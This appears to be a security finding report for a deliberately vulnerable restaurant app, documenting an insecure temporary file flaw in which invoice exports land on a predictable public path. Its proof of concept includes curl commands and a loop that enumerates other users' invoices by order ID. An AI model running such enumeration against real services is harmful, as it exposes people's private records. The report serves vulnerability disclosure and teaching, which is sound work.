# H11 — Insecure Temporary File Usage: Invoice Export (V19)

**Severity:** High  
**CWE:** CWE-377 | **OWASP:** A05:2021  
**Status:** Confirmed  
**Source draft:** `piolium/findings-draft/p7-019-v19-insecure-temp-file.md`

## Summary

Invoice exports are written to a predictable, publicly served path (`/static/exports/tmp/invoice-order-{N}.json`) with no expiration. Direct static-file access bypasses the export endpoint's ownership check.

## PoC

**Step 1: Owner exports their invoice:**
```bash
curl http://localhost:4443/api/orders/1/invoice/export \
  -H "Cookie: restaurant_session=<alice_session_for_order_1>"
# Response: {"public_url":"/static/exports/tmp/invoice-order-1.json", ...}
```

**Step 2: Anyone fetches directly via static (unauthenticated):**
```bash
curl http://localhost:4444/static/exports/tmp/invoice-order-1.json
```

**Step 3: Enumerate other users' invoices by guessing order IDs:**
```bash
for i in 1 2 3 4 5 6 7 8 9 10; do
  curl -s "http://localhost:4444/static/exports/tmp/invoice-order-$i.json"
done
```

Requires `ENABLE_ADVANCED_VULNS=true`.
